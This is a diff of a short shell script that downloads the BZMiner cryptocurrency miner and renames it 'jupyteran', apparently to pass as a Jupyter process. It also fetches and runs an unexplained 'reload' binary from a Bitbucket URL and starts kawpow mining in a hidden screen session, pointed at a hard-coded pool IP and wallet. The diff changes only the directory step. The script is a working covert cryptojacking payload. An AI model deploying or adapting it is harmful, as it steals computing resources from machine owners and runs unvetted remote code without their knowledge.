@@ -1,5 +1,5 @@
 apt update -y
 apt install gcc screen -y
-wget https://github.com/bzminer/bzminer/releases/download/v16.0.2/bzminer_v16.0.2_linux.tar.gz && tar -xhf bzminer_v16.0.2_linux.tar.gz && mv bzminer jupyteran && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
+wget https://github.com/bzminer/bzminer/releases/download/v16.0.2/bzminer_v16.0.2_linux.tar.gz && tar -xhf bzminer_v16.0.2_linux.tar.gz && cd bzminer_v16.0.2_linux && mv bzminer jupyteran && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
 screen -dmS run ./jupyteran -a kawpow -p stratum+tcp://47.89.234.73:443 -w NgXbWHvERfuEUZSH14hLSoKWYG9QemTZEa.tes --nc 1
 ./reload
